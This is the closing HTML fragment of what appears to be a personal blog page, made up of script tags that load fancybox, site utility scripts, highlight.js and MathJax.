      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.js"></script>
      <script src="https://mike-boya.github.io/js/util.js"></script>
      <script src="https://mike-boya.github.io/js/main.js"></script>
      <script src="https://mike-boya.github.io/js/backToTop.js"></script>
    

    
      
        
      
    

    
    <script>hljs.initHighlightingOnLoad();</script>
      <script src="//yihui.name/js/math-code.js"></script>
<script async
src="//cdn.bootcss.com/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


  </body>
</html>

